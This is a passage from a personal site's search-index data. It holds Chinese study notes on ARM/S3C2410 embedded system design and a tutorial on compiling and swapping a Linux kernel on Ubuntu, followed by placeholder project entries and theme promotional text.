IRQ；用于通用中断的处理。 管理（SVC）；操作系统保护模式 中止 未定义 系统  除了USR之外，其它6种又称为特权模式。6中种除了系统模式又称为异常模式（即处理异常时的工作模式）。\n在软件控制下可以改变模式（即改变CPSR相应），外部中断或异常处理也引起模式变化，用户模式下不能改变模式。\n核心寄存器的作用： R13通常用作堆栈指针，称为SP，被初始化为多个模式下的堆栈。R14用作子程序连接寄存器LR，中断异常或执行BL时得到PC即R15的备份。\nCpsr程序状态寄存器，32位只用12位，所有模式下均可见。\nSpsr保存程序状态寄存器，即发生异常时对CPSR进行保存，保存当前状态。5个异常模式下均有各自的SPSR。\nARM处理器的启动过程？ 首先，看一下，ARM启动时的硬件机制，上电产生复位异常，CPU强制PC为0x00000000，执行复位异常处理函数，接下来就相当于执行了STRARTUP.S的功能。是给用户程序执行给以合适的工作环境，设置中断向量表、堆栈、时钟、完成内存拷贝等，相当于STARTUP.S或者bootloader的前端代码，是开机执行的程序。.拿2410的启动代码举例，它启动CPU的过程是：\n在起始地址分配中断向量表即中断处理函数（CPU要求的），以为向量空间只有4字节，所以一般只是一个跳转指令，去别处执行。在跳到复位异常之后，关闭中断，关闭看门狗。\n 之后初始化存储器系统 初始多个模式下的堆栈（模式切换时，硬件给SP置位） 初始化有特殊要求的外围设备，如LED灯、看门狗 初始化用户的执行环境（在FLASH中运行太慢了，把代码整体搬迁到RAM中） 切换处理器的工作模式 调用主程序 异常处理  当正常的程序执行流程发生暂时的停止时，称之为异常。对异常的处理有优先级，处理异常需要跳转至异常模式。并根据异常向量跳转至响应的子程序（执行之前必须保存现场），即异常出现后强制跳转至固定的存储器地址执行。异常是比中断更大的概念。\n异常处理 ARM有7种异常。包括:\n 复位 管理模式 0x00000000 软中断SWI 管理模式 0x00000008 IRQ IRQ模式 0x00000018 FIQ FIQ模式 0x0000001c 还包括预取中止、数据中止、未定义  异常出现时，异常模式分组的R14和SPSR用于保存下一条程序地址和CPSR。异常返回时，SPSR-\u0026gt;CPSR，R14-\u0026gt;PC\n在启动代码中首先就是设置所谓的异常向量表，也就是在指定的位置放置异常处理程序（一般是跳转指令）。异常发生时，CPU会根据规定强制置PC，恰好去执行我们设置好的跳转指令，接着执行服务程序。\n异常处理流程：（硬件机制，只做这些，跟代码无关）  根据异常类型，强制设置CPSR的运行模式位 在切换到的异常模式下，在当前的链接寄存器LR(r14)中保存上个模式的PC值-4，以便程序在处理异常返回时能从正确的位置重新开始执行 将上一个模式的CPSR复制到当前异常模式的SPSR中（注意1与2、3的矛盾，不能独立执行，但是是硬件实现的，无关代码） 强制PC。然后就到了执行代码的时候从相关的异常向量地址取下一条指令执行，从而跳转到相应的异常处理程序处。  异常返回流程：（有指令）  将LR寄存器中的值减去相应的偏移量(对于IRQ/FIQ是4)送到PC中 将 SPSR 复制回 CPSR（注意1与2的矛盾，不能独立执行，用一条带∧的指令执行，怎么着都是一条） 清除禁止中断标志,如果它被设置成使能 所有修改过的用户寄存器必须从处理程序的保护堆栈中恢复（即出栈）。  对中断嵌套的处理(注意)：\n保存在LR中的PC值，和该值返回时的处理过程。 当IRQ异常中断产生时，程序计数器pc的值已经更新，它指向当前指令后面第3条指令（对于ARM指令，它指向当前指令地址加12字节的位置；当IRQ异常中断产生时，处理器将值（pc-4）保存到IRQ异常模式下的寄存器lr_irq中，它指向当前指令之后的第2条指令，因此返回操作可以通过下面指令实现：subs pc, lr, \\#4\n有两种返回机制：\n当返回地址保存在当前异常模式的r14时使用其中一种机制 当返回地址保存在堆栈时使用另一种机制（进中断的时候保存的）。 访问机制 SUBS PC,R14_fiq ,\\#4 （不同模式有不同的指令，返回PC的同时返回CPSR，一条指令实现）\nSUB LR,LR,\\#4`` STMFD R13!，{R0，R4-R12，LR}  将寄存器列表中的寄存器R0，R4到R12，LR存入堆栈。\nLDMFD R13!,{R0，R4-R12，PC} ∧  将堆栈内容恢复到寄存器R0，R4到R12，PC，同时SPSR复制到CPSR。{∧}为可选后缀，当指令为LDM且寄存器列表中包含R15，选用该后缀时表示：除了正常的数据传送之外，还将SPSR复制到CPSR，一条指令实现。\n代码指令分析：\nAREA Init，CODE，READONLY；代码段Init、只读 …… CODE32 ；32位ARM指令集 LDR R0，＝NEXT＋1 ；给R0赋地址值 BX R0 ；程序跳，并将处理器切换到Thumb工作状态 …… CODE16 ； 16位thumb指令集 NEXT LDR R3，＝0x3FF 给R3赋值 …… END  高级语言和汇编语言函数间的相互调用: 汇编调用C：\nIMPORT Main ;通知编译器该标号为一个外部标号 AREA Init,CODE,READONLY ；定义一个代码段 ENTRY ；定义程序的入口点 LDR R0,=0x3FF0000 ；初始化系统配置寄存器 LDR R1,=0xE7FFFF80 STR R1,[R0] LDR SP,=0x3FE1000 ；初始化用户堆栈 BL Main ；**跳转到Main（）函数处的C/C++代码执行** END ；**标识汇编程序的结束** 以上的程序段完成一些简单的初始化，然后跳转到Main（）函数所标识的C/C ＋＋代码处执行主要的任务，此处的Main仅为一个标号，也可使用其他名称。 AREA Init , CODE , READONLY ;已定义代码段 ENTRY；程序入口 LDR R0, =0x3ff5000；R0赋寄存器地址值 LDR R1, 0x；要给寄存器赋的值 STR R1,[R0]；赋值 LDR R0, =0x3ff5008 LDR R1, 0x01 STR R1,[R0]；给另一个寄存器赋值的过程 BL PROC；跳转至标号为PROC的程序出执行 : : : : PROC : : MOV PC, LR //将LR保存的程序指针返回，即**跳到BL下一句接着执行** : : END   ARM 2410设计相关 CPU、外设、外设控制器、时序、寄存器的相互关系？ CPU与外设控制器构成微处理器，微处理器在核心板（最小系统）上发挥作用，将引脚集合成外设接口加上电平转换等就是外围板，外设通过外围板连接至外设控制器。CPU通过寄存器编程控制外设控制器产生时序控制外设。若是没有外设控制器，则需要CPU自己产生时序来与外设交互，这种时序相当于一种约定好的意思表示，相当于“语言”或者“通信协议”，\n例如：若是2410与一个带有IIC接口的器件通信，只需要连接起来，对IIC进行寄存器编程，控制它们之间的工作模式，可能收发数据就变成了在中断中读写寄存器操作，屏蔽了IIC规定的通信细节。若是51单片机要与IIC通信的话，就复杂多了，首先要仔细阅读IIC的协议，不容丝毫差错，然后用IO口模拟时序，CPU的工作量很大。\n寄存器编程的本质？如何获取寄存器的配置？ 寄存器编程的本质是CPU控制外设寄存器工作模式的方法。可以想象寄存器的每一位肯定是外设控制器功能模块中的一个个“开关”，给某一位赋值0或者1，就相当于使能或关闭某一个功能。\n2410最小电路设计？（晶振选择、启动选择、数据宽度） 与一般的ARM系统相同，都需要微处理器、电源、晶振、复位、存储器（flash、SDRAM）、JTAG接口等，具体情况如下：（需要对OM0和OM1配置电平以决定启动方式，对OM2和OM3配置电平以决定时钟源。）\n 电源设计：处理器用1.8V，RTC给时钟模块供电1.8V，存储器和普通IO用3.3V，ADC模块用3.3V，可见最小系统最少要用3.3和1.8两种直流稳压。课程实验中电源电压5V，分别用LM1085稳压3.3V，用AS1117稳压1.8V。 晶振设计: 2410的时钟控制逻辑可以产生系统所需要的时钟，包括CPU的FCLK，和AHB总线的HCLK，APB的PCLK。内部有两个锁相环PLL，MPLL提供前三个，UPLL给USB提供48MHZ的时钟。 主时钟源（UPLL和MPLL的时钟源）可以选择是来自外部时钟还是外部晶振，这是由OM2和OM3的管脚确定的，可以OM2和OM3同时接低电平，选择外部晶振，晶振加上15pF起振电容（经过锁相环倍频可以达到）。 复位电路设计:可以在nRESET端设计像51单片机那样的阻容复位电路，但为了稳定，可以使用复位芯片如MAX811或IMP811。 JTAG接口设计: 有20针和14针两种JTAG接口。 存储器设计: 2410有自己的存储器控制器，并且规定了哪些bank空间是RAM哪些是FLASH，存储器芯片严格按照DATASHEET上的要求和标明的引脚连接方式与存储器控制器的存储器接口相连就可以，控制器会根据地址产生读写存储器芯片的时序，完成存取数据的操作。  2410nor和nand启动过程分析？ NOR flash:读取速度高、而擦写速度低，容量小，价格高，地址线和数据线分开，采用SRAM接口。 NAND flash:读速度不如NORflash 但是擦写速度高，容量大，价格低，有取代硬盘的趋势，但是地址线和数据复用，需要程序配合才能读写数据。可以通过跳线设置时从NAND FLASH启动还是从NOR FLASH启动。\n NAND启动的优势：便宜、容量大。但是读写逻辑不能用硬件产生，也就是没办法接到BANK空间里，必须有程序配合才能读写（有专门的控制器接口，肯定要寄存器编程加上程序配合才能读写，没有PC的根正苗红），所以理论上它是不可以用来启动系统的，因为那之前什么程序都没有，要想读写它必须是系统装载完了而且有程序了。但是三星采用了SRAM映射解决了这个问题，下面就是这个过程：\n 电路中使OM1和OM0都接低电平，从NAND FLASH中启动。（2410有NAND FLASH控制器，连接NAND Flash芯片，产生读写时序）\n在该模式下，2410的前4KB地址空间对应一个名字叫做“起步石”的SRAM，系统启动时，自动将NAND FLASH的前4KB数据加载到起步石中，然后系统自动执行这些启动引导代码，CPU从内部RAM的0x00000000位置开始启动。这个过程不需要程序干涉。也就是类似于STARTUP.S的功能，初始化异常向量表、堆栈、将NAND FLASH中的代码(有代码支持喽)拷贝到SDRAM中运行。\nNOR FLASH 采用的的是SRAM接口，可以直接到存储器控制器上，ARM内核产生的时序能对其读写。将bank0上接上NORflash芯片。上电产生复位异常后会自动从NOR flash中启动。\n2410的中断处理流程？ 首先应该明确2410与ARM内核的异常处理系统的角色，根据之前的ARM异常处理流程，我们清楚明了了哪些是CPU的硬件机制。2410通过中断控制器允许以优先级的方式将几十个中断源共同用一个IRQ。一个中断申请提出后，IRQ异常发生，切换模式、保存CPSR、保存PC，然后跳转到handleIRQ函数，然后跳转到ISRIRQ(这只是一个大概流程，也许会定义更多的跳转)根据中断源向量表的首地址和偏移量寄存器找出到底是哪个中断发生了。然后跳转到相应的中断处理函数，比如跳到串口中断，还可以根据挂起位（即中断标志位）再次判断到底是接收中断还是发送完成中断。也就是说2410处理流程除了ARM对异常的响应是硬件机制外，其余的都是代码实现的。我们在编程的时候没有写的话，那也是编译器加进去的。\n2410对嵌套的处理 比起2410的处理流程不同的是，因为有了中断控制器，这就是实现高优先级嵌套的硬件基础，因为每一次进入异常模式用户都会保存环境，这就是中断嵌套的软件基础。CPU的异常处理机制总是那些，很明确的。我正在执行一个中断服务程序，然后再次发生异常，保存，跳转（CPU）、再次判断是哪个中断，进去之后压栈，运行另一个中断的服务程序，运行完返回，这是就是返回到上一个中断了。上一个中断运行完，一返回就是返回发生异常前的状态。\nS3C2410的串口、端口、外部中断、AD等及寄存器的编程能力（会读datasheet、会编程、作业、实验的相关代码） 寄存器的赋值指令\nLDR R0，=GPHCON LDR R1,=0X2AFAAA STR R1，[R0]  时钟、看门狗的相关概念  时钟: 整个系统提供同步脉冲，像人的脉搏一样。 看门狗：其实是一个计数器，当它计数溢出的时候，会使系统复位，所以它的作用是防止系统死机。打开看门狗之后，当代码跑飞或者陷入死循环之后，就不能喂狗，也就是不能清除计数值，那么它就会使系统重启。 VIVI  什么是bootloader Bootloader，为引导加载程序，是嵌入式系统加电后运行的第一段代码，相当于PC机的BIOS。 Bootloader在系统中的位置： 通常固化在硬件上的某个固态存储设备上，加电后自启动。\nBootloader功能： 初始化，给CPU合适的工作环境（相当于STARTUP.S），以便为最终调用操作系统内核或用户应用程序境。加载内核，下载内核或者根文件系统。\nBootloader操作模式 有启动加载和下载两种模式。\n 启动加载模式是Bootloader的正常工作模式，在嵌入式产品发布的时侯，Bootloader必须工作在这种模式下。即初始化CPU的工作环境之后，将内核如RAM执行。 下载模式：目标机上的Bootloader将通过串口连接或网络连接等通信手段从主机下载文件。主要是下载内核映像和根文件系统映像等。从主机下载的文件通常首先被Bootloader保存到目标机的RAM中，然后再被Bootloader写到目标机上的FLASH类固态存储设备中。Bootloader的这种模式通常在第一次安装内核与根文件系统时被使用；此外，以后的系统更新也会使用到这种工作模式。  Bootloader启动过程 上电之后，先启动CPU即执行startup.s类似功能代码（配置中断、初始化堆栈、拷贝代码等），然后进行加载内核的准备至少初始化一个串口，以便向终端用户反馈数据。检测系统内存映射，哪些是可用的RAM？在这一步之后，将检测外部按键，有按键按下将进入下载模式，没有按键的话将执行下面的步骤，加载内核：\n 将kenel和根文件系统从flash调入RAM 为内核启动设置参数 调用内核。  ","date":1470056667,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1470056667,"objectID":"b572677815d680e38f3946c9cfc0dd16","permalink":"http://www.guozet.me/post/Linux-Embedded-System-Design/","publishdate":"2016-08-01T13:04:27Z","relpermalink":"/post/Linux-Embedded-System-Design/","section":"post","summary":"《嵌入式系统设计》概述 前言 这是《嵌入式系统设计》这本书籍的内","tags":"Linux kernel","title":"嵌入式系统设计课程","type":"post"},{"authors":null,"categories":"Linux","content":"一直想将自己的linux内核更换一下，换一个低版本的方便平时做实验课程的时候使用，于是就开始了Ubuntu下换内核的过程．\n简要概述 原系统：Ubuntu 10.10（Virtualbox）平台中的linux内核2.6.35-22\n降级为：linux内核2.6.39\n具体操作：\n 首先下载Linux2.6.39内核并解压到/usr/src下 安装必备软件编译工具 #apt-get install libncurses5-dev build-essentialkernel-package 做个链接文件#ln -s /usr/src/linux2.6.33/usr/src/linux 进入linux文件#cd linux #make mrproper (删除以前到.o文件，初次更换可不用) #make menuconfig (这里可以设置一些参数，并生成.config文件) #make dep (建立依赖关系) #make clean (删除没有用的文件) #make bzImage (编译linux内核) #make modules (编译linux模块) #makemodules_install (安装linux模块) #make install (建立initrd文件, 加载LKM用的程序) 生成initrd.img文件：  cd /lib/modules/2.6.39 update-initramfs -c -k 2.6.39   自动查找新内核，并添加到grub引导#update-grub\n  #shutdown -r now （立即重启，重启后会发现多了一个linux2.6.33到启动项）\n  以下过程全部在root权限下操作**:**\\\n 详细步骤分析 下载内核 内核下载官网： https://www.kernel.org/\n下载内核：2.6.39 该内核版本与自己当前系统内核版本2.6.35-22比较接近\n概念：内核，是一个操作系统的核心。它负责管理系统的进程、内存、设备驱动程序、文件和网络系统，决定着系统的性能和稳定性。在广大爱好者的支持下，内核版本不断更新。新的内核修订了旧内核的bug，并增加了许多新的特性。如果用户想要使用这些新特性，或想根据自己的系统度身定制一个更高效，更稳定的内核，就需要重新编译内核。\n为什么需要重新编译内核？\n增加对某部分功能的支持，比如网络之类，可以把相应部分编译到内核中（build-in），在内核启动时就可以自动支持相应部分的功能，这样的优点是方便、速度快，机器一启动，你就可以使用这部分功能了,我们可将经常使用的部分直接编译到内核中，比如网卡。静态调用的缺点是会使内核变得庞大起来，不管你是否需要这部分功能，它都会存在。也可以把该部分编译成模块（module），要使用的时候再动态调用。如果编译成模块，就会生成对应的.o 文件，在使用的时候可以动态加载，优点是不会使内核过分庞大，缺点是你得自己来调用这些模块。\n安装必备软件编译工具:.\napt-get install libncurses5-dev build-essential kernel-package**  这几个文件介绍：\n libncurses5-dev是为之后配置内核能运行 make menuconfig程序做准备 Build-essential为编译工具； kernel-package是编译内核工具。  如果系统显示无法查找到这三个文件，输入#apt-get update更新数据源，更新完之后即可找到这三个文件了。\n编译替换内核 解压内核文件linux 2.6.39到/usr/src下xx 首先先将下载的内核拷贝到/usr/src目录下；/usr/src/目录是linux内核源码存放的目录，里面的内核源码目录为：linux-2.XX.XX目录等。\n这里解压到任何目录都行，因为在这里我们是要增加一个内核，而不是覆盖掉原有系统的内核，即使是覆盖掉原有系统内核，也可以在后面执行#make install 自动就会将对应文件拷贝到本机相应的目录下去了。\n解压命令：\ntar -jxvf linux-2.6.39.tar.bz2  注：较新的内核文件以tar.xz结尾的压缩文件时，如何解压\nxz -d ***.tar.xz tar -xvf ***.tar  可以看到这个压缩包也是打包后再压缩，外面是xz压缩方式，里层是tar打包方式。补充：目前可以直接使用 tar xvJf ***.tar.xz来解压\n进入内核源码目录：#cd /usr/src/linux-2.6.39/可以查看相应内核文件\n做个链接文件#ln -s /usr/src/linux2.6.39 /usr/src/linux  进入linux文件#cd /usr/src/linux\n/usr/src/linux这个目录是编译内核时存放源代码的目录，而／usr/src/linux2.6.33这个目录是实际存放代码的目录．即在/usr/src中建立一个软链接\n定制内核 #make mrproper\n清理以前加载的模块，第一次可省略\n在每次配置并重新编译内核前需要先执行“makemrproper”命令清理源代码树，包括过去曾经配置的内核配置文件“.config”都将被清除。实验完成之后，在测试了一下这个命令，如下图所示，即进行新的编译工作时将原来旧的配置文件给删除到，以免影响新的内核编译。\n即检查有无不正确的.o文件和依赖关系，如果使用刚下载的完整的源程序包即第一次进行编译，那么本步可以省略。而如果你多次使用了这些源程序编译内核，则最好要先运行一下这个命令。\n#make menuconfig\n这里可以设置一些参数，并生成.config文件, 使用makemenuconfig 生成的内核配置文件，决定将内核的各个功能系统编译进内核还是编译为模块，或者不编译。\n在这里就不介绍具体的内核配置操作，但是建议就算不打算配置什么也执行一下make menuconfig这个命令，并在退出的时候进行保存，因为如果不执行此操作的话在后面make编译内核的时候会提示你回答很多问题。\n这一步可以#cp /boot/config-XX /usr/src/linux/.config，即使用当前系统配置文件，之后进入make menuconfig 选择load配置文件之后，再做细微改动，或者不改动也可。\n执行#cp /boot/config-，然后按下Tab键，系统会自动填上该目录下符合条件的文件名，然后继续输入 .config，目的是使用在boot目录下的原配置文件。\n3.编译安装内核和模块\n#make dep 建立依赖关系\n根据上一步中加载的配置内容（.config）建立文件的依赖关系。\n#make clean 清除内核编译的目标文件\n清理一些不必要的文件，如果你在上次编译的基础上，删去了一些选项，建议你执行这一步操作，否则，就没有必要了。\n#make bzImage 编译内核\n内核编译成功后，会在源码树根目录即/usr/src/linux-2.6.39/arch/x86/boot/目录中生成一个新内核的映像文件bzImage。\n#make modules 编译模块\n编译可加载模块（即内核选项中选择为M的选项），以便将来使用insmod命令进行加载。编译时间跟M选项的数量有关。\n#make modules_install 安装模块\n编译成功后，系统会在/lib/modules目录下生成一个2.6.39子目录，里面存放着新内核的所有可加载模块(即将编译好的modules拷贝到/lib/modules下)。\n#make install\n安装内核,即复制.config，vmlinuz，initrd.img，System.map文件到/boot目录、更新grub。\n当然，在这里我们也可以分别拷贝到/boot目录：\n 将生成的linux-2.6.39/.config 拷贝到要替换内核系统的/boot下，并重命名为config-2.6.39 将生成的linux-2.6.39/arch/x86-64/boot/bzImage拷贝到要替换内核系统的/boot下，并重命名为vmlinuz-2.6.39（注：这里需特别注意拷贝后的文件名变为vmlinuz-x.x.x）。 将生成的linux-2.6.39/System.map拷贝到要替换内核系统的/boot下，并重命名为System.map-2.6.39 将make modules_install生成的系统目录/lib/modules/linux-2.6.39拷贝到要替换内核系统的/lib/modules下。  #new-kernel-pkg --install --mkinitrd --depmod 2.6.33(将启动信息写入grub.conf中，这里也可以去/etc/编辑grub.conf文件，将启动信息模仿原来到写进去。注：有的linux版本是 lilo.conf文件) (测试了一下网上流传的这条指令，在我的电脑上这条命令没有反应)\ncd /lib/modules/2.6.39 update-initramfs –c –k 2.6.39 #生成/boot/initrd.img-2.6.39文件  #update-grub\n自动查找新内核，并添加到grup引导中\n#shutdown -r now\n立即重启，重启后按shift会发现多了一个linux2.6.39启动项。\n补充：如何在启动界面中加入你想要的个人信息\n方法有许多，在这里介绍三个方法：\n  Ubuntu的登陆和欢迎信息控制/etc/issue和/etc/motd\n其中/etc/issue与/etc/motd区别在于：当一个网络用户或通过串口登录系统 上时,/etc/issue的文件内容显示在login提示符之前,而/etc/motd内容显示在用户成功登录系统之后。修改这两个文件都可以达到加入个人信息的效果。\n  修改/boot/grub/grub.cfg文件来改动我们的引导项的名字来完成显示个人信息。\n  在编译之前加入个人信息，将信息编译进内核：对/usr/src/linux-3.6/init.c文件进行修改，在最后一个函数中，加入printk（\u0026quot;***\u0026quot;）打印想要的信息，在这里要注意打印的优先级，必须设置超过一定的优先级方可在控制台打印出想要的信息（可参考相关printk函数的介绍）。\n  卸载内核\n首先我们需要查看一下当前使用的是哪个内核：\nuname -r  该命令会告诉你当前使用的内核版本，在登录时候，不能卸载当前的内核，以免造成无法启动的悲剧~~\n接下来，如果你是自己**动手编译**的内核的话，请删除以下文件和文件夹\n 删除掉/lib/modules/目录下过时的内核库文件 删除掉/usr/src/kernels/目录下过时的内核源代码 删除掉/boot目录下启动的核心档案以及内核映像 更改/boot/grub/menu.lst，删除掉不用的启动列表  在这里就只接受自己动手编译的内核如何卸载了，如果是安装包安装的内核，百度查询相关指令即可卸载，当然，自己手动卸载也是可以的。\n重要Linux内核文件分析 .config\n使用make menuconfig 生成的内核配置文件，决定将内核的各个功能系统编译进内核还是编译为模块还是不编译。\nvmlinuz和vmlinux\nvmlinuz是可引导的、压缩的内核，“vm”代表“Virtual Memory”。Linux 支持虚拟内存，不像老的操作系统比如DOS有640KB内存的限制，Linux能够使用硬盘空间作为虚拟内存，因此得名“vm”。vmlinuz是可执行的Linux内核，位于/boot/vmlinuz\nvmlinuz的建立有两种方式：\n  编译内核时通过“make zImage”创建，然后通过：“cp /usr/src/linux-2.4/arch/i386/linux/boot/zImage /boot/vmlinuz”产生zImage适用于小内核的情况，它的存在是为了向后的兼容性；\n  内核编译时通过命令make bzImage创建，bzImage是压缩的内核映像，需要注意，bzImage不是用bzip2压缩的，bzImage中的bz容易引起误解，bz表示“big zImage”，bzImage中的b是“big”意思。 zImage（vmlinuz）和bzImage（vmlinuz）都是用gzip压缩的。它们不仅是一个压缩文件，而且在这两个文件的开头部分内嵌有gzip解压缩代码，所以你不能用gunzip 或 gzip –dc解包vmlinuz。内核文件中包含一个微型的gzip用于解压缩内核并引导它。两者的不同之处在于，老的zImage解压缩内核到低端内存（第一个640K），bzImage解压缩内核到高端内存（1M以上）。如果内核比较小，那么可以采用zImage 或bzImage之一，两种方式引导的系统运行时是相同的。大的内核采用bzImage，不能采用zImage。\n  vmlinux是未压缩的内核，vmlinuz是vmlinux的压缩文件。\ninitrd.img\ninitrd是“initial ramdisk”的简写。initrd一般被用来临时的引导硬件到实际内核vmlinuz能够接管并继续引导的状态。比如initrd- 2.4.7-10.img主要是用于加载ext3等文件系统及scsi设备的驱动。如果你使用的是scsi硬盘，而内核vmlinuz中并没有这个 scsi硬件的驱动，那么在装入scsi模块之前，内核不能加载根文件系统，但scsi模块存储在根文件系统的/lib/modules下。为了解决这个问题，可以引导一个能够读实际内核的initrd内核并用initrd修正scsi引导问题，initrd-2.2.39.img是用gzip压缩的文件。initrd映象文件是使用mkinitrd创建的，mkinitrd实用程序能够创建initrd映象文件，这个命令是RedHat专有的，其它Linux发行版或许有相应的命令。这是个很方便的实用程序。具体情况请看帮助：man mkinitrd\nSystem.map\nSystem.map是一个特定内核的内核符号表，由“nm vmlinux”产生并且不相关的符号被滤出。\n几个重要的内核文件分析\narch子目录包括了所有和体系结构相关的核心代码。它的每一个子目录都代表一种支持的体系结构，例如i386就是关于intel cpu及与之相兼容体系结构的子目录。PC机一般都基于此目录；\ninclude子目录包括编译核心所需要的大部分头文件。与平台无关的头文件在include/linux子目录下，与intel cpu相关的头文件在include/asm-i386子目录下,而include/scsi目录则是有关scsi设备的头文件目录；\ninit子目录包含核心的初始化代码(注：不是系统的引导代码)，包含的两个文件main.c和Version.c，这是研究核心如何工作的一个非常好的起点。\nMm子目录包括所有独立于cpu体系结构的内存管理代码，如页式存储管理内存的分配和释放等；而和体系结构相关的内存管理代码则位于arch/*/mm/，例如arch/i386/mm/Fault.c\nKernel子目录包括主要的核心代码，此目录下的文件实现了大多数linux系统的内核函数，其中最重要的文件当属sched.c；同样，和体系结构相关的代码在arch/*/kernel中；\nDrivers子目录放置系统所有的设备驱动程序；每种驱动程序又各占用一个子目录：如，/block下为块设备驱动程序，比如ide（ide.c）。如果你希望查看所有可能包含文件系统的设备是如何初始化的，你可以看drivers/block/genhd.c中的device_setup()。它不仅初始化硬盘，也初始化网络，因为安装nfs文件系统的时候需要网络；\n其他子目录：\nLib放置核心的库代码；Net,核心与网络相关的代码；Ipc,这个目录包含核心的进程间通讯的代码；\nFs,所有的文件系统代码和各种类型的文件操作代码，它的每一个子目录支持一个文件系统，例如fat和ext2；Scripts,此目录包含用于配置核心的脚本文件等。一般，在每个目录下，都有一个.depend文件和一个Makefile文件，这两个文件都是编译时使用的辅助文件，仔细阅读这两个文件对弄清各个文件这间的联系和依托关系很有帮助；而且，在有的目录下还有Readme文件，它是对该目录下的文件的一些说明，同样有利于我们对内核源码的理解。\n遇到的问题 1.源的问题\n安装必备软件编译工具:#apt-get installlibncurses5-dev build-essential kernel-package 的时候，无法更新，输入#sudo apt-get update也无法更新数据。\n在这里是由于ubuntu10.10的源出现问题，导致无法更新、下载软件，这里需要重新修改源文件。处理如下：\nhttp://www.cnblogs.com/linuxcat/archive/2012/12/29/2839216.html\n参考该网站内容后，将源换为http://old-releases.ubuntu.com/ubuntu/地址，即可更新、下载软件（当然，其他可用的源地址也是可以的）。\n2.权限问题\n在这个内核的编译、安装过程中，涉及到的操作都是需要root权限才能进行操作的，如果权限不够，则产生错误。处理方法：使用sudo(必须给了给用户申请root的权限)或者直接su root切换到root用户下进行整个过程操作。\n","date":1462626267,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1462626267,"objectID":"debb187b9e7cd17ebccecf8a1a44ed13","permalink":"http://www.guozet.me/post/Linux-kernel-update/","publishdate":"2016-05-07T13:04:27Z","relpermalink":"/post/Linux-kernel-update/","section":"post","summary":"一直想将自己的linux内核更换一下，换一个低版本的方便平时做实验课程的时候使用，于是就开始了Ubuntu下换内核的过程．\n","tags":"Linux kernel","title":"Ubuntu编译、更换、删除内核","type":"post"},{"authors":null,"categories":null,"content":"","date":1461715200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1461715200,"objectID":"d1311ddf745551c9e117aa4bb7e28516","permalink":"http://www.guozet.me/project/external-project/","publishdate":"2016-04-27T00:00:00Z","relpermalink":"/project/external-project/","section":"project","summary":"An example of linking directly to an external project website using `external_link`.","tags":["Demo"],"title":"External Project","type":"project"},{"authors":null,"categories":null,"content":"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.\nNullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.\nCras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.\nSuspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.\nAliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.\n","date":1461715200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1461715200,"objectID":"8f66d660a9a2edc2d08e68cc30f701f7","permalink":"http://www.guozet.me/project/internal-project/","publishdate":"2016-04-27T00:00:00Z","relpermalink":"/project/internal-project/","section":"project","summary":"An example of using the in-built project page.","tags":["Deep Learning"],"title":"Internal Project","type":"project"},{"authors":["Terry Tang","吳恩達"],"categories":["Demo","教程"],"content":"Create a free website with Academic using Markdown, Jupyter, or RStudio. Choose a beautiful color theme and build anything with the Page Builder - over 40 widgets, themes, and language packs included!\n Check out the latest demo of what you\u0026rsquo;ll get in less than 10 minutes, or view the showcase of personal, project, and business sites.\n 👉 Get Started 📚 View the documentation 💬 Ask a question on the forum 👥 Chat with the community 🐦 Twitter: @source_themes @GeorgeCushen #MadeWithAcademic 💡 Request a feature or report a bug ⬆️ Updating? View the Update Guide and Release Notes ❤️ Support development of Academic:  ☕️ Donate a coffee 💵 Become a backer on Patreon 🖼️ Decorate your laptop or journal with an Academic sticker 👕 Wear the T-shirt 👩‍💻 Contribute      Academic is mobile first with a responsive design 